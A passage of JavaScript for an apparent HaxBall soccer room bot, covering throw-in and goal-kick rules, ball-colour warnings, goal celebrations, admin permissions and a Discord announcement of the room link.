				game.warningCount++;
				game.outStatus = "redThrow";										
				room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});	
				sleep(100).then(() => {
					room.setDiscProperties(0, {xspeed: 0, yspeed: 0, color: "0xff3f34", x: game.ballOutPositionX, y: game.throwInPosY});
				});
			}
			game.pushedOut = true;
		}
		
		if (room.getBallPosition().y < 611.45 && room.getBallPosition().y > -611.45 && game.throwinKicked == true) { // if throw is good
			game.outStatus = "";
			game.rsActive = true;
			game.rsReady = false;
			room.setDiscProperties(0, {color: "0xffffff"});
			game.rsTimer = 1000000;
			game.warningCount++;
		}
		
		if (room.getBallPosition().y.toFixed(1) == game.throwInPosY.toFixed(1) && room.getBallPosition().x.toFixed(1) == game.ballOutPositionX.toFixed(1)) {
			game.bringThrowBack	= false;
			game.pushedOut = false;
		}
	}
}


function handleBallTouch() {
	var players = room.getPlayerList();
	var ballPosition = room.getBallPosition();
	var ballRadius = game.ballRadius;
	var playerRadius = 15;
	var triggerDistance = ballRadius + playerRadius + 0.01;
	
	for (var i = 0; i < players.length; i++) { // Iterate over all the players
		var player = players[i];
		if ( player.position == null ) continue;
		var distanceToBall = pointDistance(player.position, ballPosition);
		if ( distanceToBall < triggerDistance ) {				
			game.rsTouchTeam = player.team;
			game.throwinKicked = false;
			
			if (game.rsCorner == false && room.getDiscProperties(0).xgravity != 0) {
				room.setDiscProperties(0, {xgravity: 0, ygravity:0});
				game.rsSwingTimer = 10000;
			}
		}		
	}
}

function updateGameStatus() {
	game.time = Math.floor(room.getScores().time);
	game.ballRadius = room.getDiscProperties(0).radius;
}


function announce(msg, targetId, color, style, sound) {
	if (color == null) {
		color = 0xFFFD82;
	}
	if (style == null) {
		style = "bold";
	}
	if (sound == null) {
		sound = 0;
	}
	room.sendAnnouncement(msg, targetId, color, style, sound);
	console.log("Announce: " + msg);
}

function whisper(msg, targetId, color, style, sound) {
	if (color == null) {
		color = 0x66C7FF;
	}
	if (style == null) {
		style = "normal";
	}
	if (sound == null) {
		sound = 0;
	}
	room.sendAnnouncement(msg, targetId, color, style, sound);
	if (room.getPlayer(targetId) != null) {
		console.log("Whisper -> " + room.getPlayer(targetId).name + ": " + msg);
	}
}

function isAdminPresent() {
	var players = room.getPlayerList();
	if (players.find((player) => player.admin) != null) {
		return true;
	}
	else {
		return false;
	}
}

function displayAdminMessage() {
	if (isAdminPresent() == false && allowPublicAdmin == true) {
		announce("No admin present: Type !admin to take control");
	}
}

function sleep (time) {
	return new Promise((resolve) => setTimeout(resolve, time));
  }
  
  function ballWarning(origColour, warningCount) {
	  sleep(200).then(() => {
		  if (game.warningCount == warningCount) {
			  room.setDiscProperties(0, {color: "0xffffff"});
		  }
	  });
	  sleep(400).then(() => {
		  if (game.warningCount == warningCount) {
			  room.setDiscProperties(0, {color: origColour});
		  }
	  });
	  sleep(600).then(() => {
		  if (game.warningCount == warningCount) {
			  room.setDiscProperties(0, {color: "0xffffff"});
		  }
	  });
	  sleep(800).then(() => {
		  if (game.warningCount == warningCount) {
			  room.setDiscProperties(0, {color: origColour});
		  }
	  });
	  sleep(1000).then(() => {
		  if (game.warningCount == warningCount) {
			  room.setDiscProperties(0, {color: "0xffffff"});
		  }
	  });
	  sleep(1200).then(() => {
		  if (game.warningCount == warningCount) {
			  room.setDiscProperties(0, {color: origColour});
		  }
	  });
	  sleep(1400).then(() => {
		  if (game.warningCount == warningCount) {
			  room.setDiscProperties(0, {color: "0xffffff"});
		  }
	  });
	  sleep(1600).then(() => {
		  if (game.warningCount == warningCount) {
			  room.setDiscProperties(0, {color: origColour});
		  }
	  });
	  sleep(1675).then(() => {
		  if (game.warningCount == warningCount) {
			  room.setDiscProperties(0, {color: "0xffffff"});
		  }
	  });
	  sleep(1750).then(() => {
		  if (game.warningCount == warningCount) {
			  room.setDiscProperties(0, {color: origColour});
		  }
	  });
  }
  
  function extraTime() {
	  var extraSeconds = Math.ceil(game.extraTimeCount / 60);
	  game.extraTimeEnd = (gameTime * 60) + extraSeconds;
	  announce("Extra time: " + extraSeconds + " Seconds", null, null, null, 1);
  }
  
  function avatarCelebration(playerId, avatar) {
	  room.setPlayerAvatar(playerId, avatar);
	  sleep(250).then(() => {
		  room.setPlayerAvatar(playerId, null);
	  });
	  sleep(500).then(() => {
		  room.setPlayerAvatar(playerId, avatar);
	  });
	  sleep(750).then(() => {
		  room.setPlayerAvatar(playerId, null);
	  });
	  sleep(1000).then(() => {
		  room.setPlayerAvatar(playerId, avatar);
	  });
	  sleep(1250).then(() => {
		  room.setPlayerAvatar(playerId, null);
	  });
	  sleep(1500).then(() => {
		  room.setPlayerAvatar(playerId, avatar);
	  });
	  sleep(1750).then(() => {
		  room.setPlayerAvatar(playerId, null);
	  });
	  sleep(2000).then(() => {
		  room.setPlayerAvatar(playerId, avatar);
	  });
	  sleep(2250).then(() => {
		  room.setPlayerAvatar(playerId, null);
	  });
	  sleep(2500).then(() => {
		  room.setPlayerAvatar(playerId, avatar);
	  });
	  sleep(2750).then(() => {
		  room.setPlayerAvatar(playerId, null);
	  });
	  sleep(3000).then(() => {
		  room.setPlayerAvatar(playerId, avatar);
	  });
	  sleep(3250).then(() => {
		  room.setPlayerAvatar(playerId, null);
	  });
  }
  
  function secondsToMinutes(time) {
	  // Hours, minutes and seconds
	  var hrs = ~~(time / 3600);
	  var mins = ~~((time % 3600) / 60);
	  var secs = ~~time % 60;
  
	  // Output like "1:01" or "4:03:59" or "123:03:59"
	  var ret = "";
	  if (hrs > 0) {
		  ret += "" + hrs + ":" + (mins < 10 ? "0" : "");
	  }
	  ret += "" + mins + ":" + (secs < 10 ? "0" : "");
	  ret += "" + secs;
	  return ret;
  }
  
  function blockThrowIn() {
	  var players = room.getPlayerList().filter((player) => player.team != 0);
	  if (room.getBallPosition().y < 0) { // top throw line
		  if (game.outStatus == "redThrow") {
			  players.forEach(function(player) {
				  if (player.team == 2 && room.getPlayerDiscProperties(player.id).y < 0) {
					  if (room.getPlayerDiscProperties(player.id).cGroup != 536870918) {
						  room.setPlayerDiscProperties(player.id, {cGroup: 536870918});
					  }
					  if (player.position.y < -485) {
						  room.setPlayerDiscProperties(player.id, {y: -470});
					  }
				  }
				  if (player.team == 1 && room.getPlayerDiscProperties(player.id).cGroup != 2) {
					  room.setPlayerDiscProperties(player.id, {cGroup: 2});
				  }
				  if (room.getDiscProperties(17).x != 1149) { // show top red line
					  room.setDiscProperties(17, {x: 1149});
				  }
				  if (room.getDiscProperties(19).x != -1149) { // hide top blue line
					  room.setDiscProperties(19, {x: -1149});
				  }
			  });
		  }
		  if (game.outStatus == "blueThrow") {
			  players.forEach(function(player) {
				  if (player.team == 1 && room.getPlayerDiscProperties(player.id).y < 0) {
					  if (room.getPlayerDiscProperties(player.id).cGroup != 536870918) {
						  room.setPlayerDiscProperties(player.id, {cGroup: 536870918});
					  }
					  if (player.position.y < -485) {
						  room.setPlayerDiscProperties(player.id, {y: -470});
					  }
				  }
				  if (player.team == 2 && room.getPlayerDiscProperties(player.id).cGroup != 2) {
					  room.setPlayerDiscProperties(player.id, {cGroup: 2});
				  }
				  if (room.getDiscProperties(19).x != 1149) { // show top blue line
					  room.setDiscProperties(19, {x: 1149});
				  }
				  if (room.getDiscProperties(17).x != -1149) { // hide top red line
					  room.setDiscProperties(17, {x: -1149});
				  }
			  });
		  }
	  }
	  if (room.getBallPosition().y > 0) { // bottom throw line
		  if (game.outStatus == "redThrow") {
			  players.forEach(function(player) {
				  if (player.team == 2 && room.getPlayerDiscProperties(player.id).y > 0) {
					  if (room.getPlayerDiscProperties(player.id).cGroup != 536870918) {
						  room.setPlayerDiscProperties(player.id, {cGroup: 536870918});
					  }
					  if (player.position.y > 485) {
						  room.setPlayerDiscProperties(player.id, {y: 470});
					  }
				  }
				  if (player.team == 1 && room.getPlayerDiscProperties(player.id).cGroup != 2) {
					  room.setPlayerDiscProperties(player.id, {cGroup: 2});
				  }
				  if (room.getDiscProperties(21).x != 1149) { // show bottom red line
					  room.setDiscProperties(21, {x: 1149});
				  }
				  if (room.getDiscProperties(23).x != -1149) { // hide bottom blue line
					  room.setDiscProperties(23, {x: -1149});
				  }
			  });
		  }
		  if (game.outStatus == "blueThrow") {
			  players.forEach(function(player) {
				  if (player.team == 1 && room.getPlayerDiscProperties(player.id).y > 0) {
					  if (room.getPlayerDiscProperties(player.id).cGroup != 536870918) {
						  room.setPlayerDiscProperties(player.id, {cGroup: 536870918});
					  }
					  if (player.position.y > 485) {
						  room.setPlayerDiscProperties(player.id, {y: 470});
					  }
				  }
				  if (player.team == 2 && room.getPlayerDiscProperties(player.id).cGroup != 2) {
					  room.setPlayerDiscProperties(player.id, {cGroup: 2});
				  }
				  if (room.getDiscProperties(23).x != 1149) { // show bottom blue line
					  room.setDiscProperties(23, {x: 1149});
				  }
				  if (room.getDiscProperties(21).x != -1149) { // hide bottom red line
					  room.setDiscProperties(21, {x: -1149});
				  }
			  });
		  }		
	  }	
  }
  
  
  function blockGoalKick() {
	  var players = room.getPlayerList().filter((player) => player.team != 0);
	  if (room.getBallPosition().x < 0) { // left side red goal kick
		  if (game.outStatus == "redGK") {
			  players.forEach(function(player) {
				  if (player.team == 2 && room.getPlayerDiscProperties(player.id).x < 0) {
					  if (room.getPlayerDiscProperties(player.id).cGroup != 268435462) {
						  room.setPlayerDiscProperties(player.id, {cGroup: 268435462});
					  }
					  if (player.position.x < -840 && player.position.y > -320 && player.position.y < 320) {
						  room.setPlayerDiscProperties(player.id, {x: -825});
					  }
				  }
				  if (player.team == 1 && room.getPlayerDiscProperties(player.id).cGroup != 2) {
					  room.setPlayerDiscProperties(player.id, {cGroup: 2});
				  }
			  });
		  }
	  }
	  if (room.getBallPosition().x > 0) { // right side blue goal kick
		  if (game.outStatus == "blueGK") {
			  players.forEach(function(player) {
				  if (player.team == 1 && room.getPlayerDiscProperties(player.id).x > 0) {
					  if (room.getPlayerDiscProperties(player.id).cGroup != 268435462) {
						  room.setPlayerDiscProperties(player.id, {cGroup: 268435462});
					  }
					  if (player.position.x > 840 && player.position.y > -320 && player.position.y < 320) {
						  room.setPlayerDiscProperties(player.id, {x: 825});
					  }
				  }
				  if (player.team == 2 && room.getPlayerDiscProperties(player.id).cGroup != 2) {
					  room.setPlayerDiscProperties(player.id, {cGroup: 2});
				  }
			  });
		  }		
	  }	
  }
  
  
  
  function removeBlock() {
	  var players = room.getPlayerList().filter((player) => player.team != 0);
	  if (game.outStatus == "") {
		  players.forEach(function(player) {
			  if (player.team == 1 && room.getPlayerDiscProperties(player.id).cGroup != 2) {
				  room.setPlayerDiscProperties(player.id, {cGroup: 2});
			  }
			  if (player.team == 2 && room.getPlayerDiscProperties(player.id).cGroup != 4) {
				  room.setPlayerDiscProperties(player.id, {cGroup: 4});
			  }
		  });
		  if (room.getDiscProperties(17).x != -1149) { // hide top red line
			  room.setDiscProperties(17, {x: -1149});
		  }
		  if (room.getDiscProperties(19).x != -1149) { // hide top blue line
			  room.setDiscProperties(19, {x: -1149});
		  }
		  if (room.getDiscProperties(21).x != -1149) { // hide bottom red line
			  room.setDiscProperties(21, {x: -1149});
		  }
		  if (room.getDiscProperties(23).x != -1149) { // hide bottom blue line
			  room.setDiscProperties(23, {x: -1149});
		  }		
	  }
  }

/* MISCELLANEOUS */

room.onRoomLink = function(url) {
    discord(`**¡Host x4 prendido 🔥 !  __La sala te está esperando, únete!__  ${url}**`);
}

room.onPlayerAdminChange = function (changedPlayer, byPlayer) {
	if (getMute(changedPlayer) && changedPlayer.admin) {
		sendMsgAll(changedPlayer.name + " ya no está silenciado.", 0x33FF33, "bold", 1);
		setMute(changedPlayer, false);
	}
	if (byPlayer.id != 0 && localStorage.getItem(getAuth(byPlayer)) && JSON.parse(localStorage.getItem(getAuth(byPlayer)))[Ss.RL] == "admin") {
		room.sendAnnouncement("¡No tienes permiso para nombrar a un jugador como administrador!", byPlayer.id, 0xFF9500, "bold");
		room.setPlayerAdmin(changedPlayer.id, false);
	}
}

room.onStadiumChange = function(newStadiumName, byPlayer) {
	if (newStadiumName == "HAX4 ARENA") {
		map = "RSR";
	}
	else {
		map = "custom";
	}
}

room.onGameTick = function() {
	checkTime();
	getLastTouchOfTheBall();
	getStats();
	handleInactivity();

	if (map == "RSR") {
		updateGameStatus();
		handleBallTouch();
		realSoccerRef();
	}	
}

function isGk() {
    var players = room.getPlayerList();
    var min = players[0];
    min.position = {x: room.getBallPosition().x + 60}
    var max = min;
 
    for (var i = 0; i < players.length; i++) {
        if (players[i].position != null){
            if (min.position.x > players[i].position.x) min = players[i];
            if (max.position.x < players[i].position.x) max = players[i];
        }
    }
    return [min, max]
}
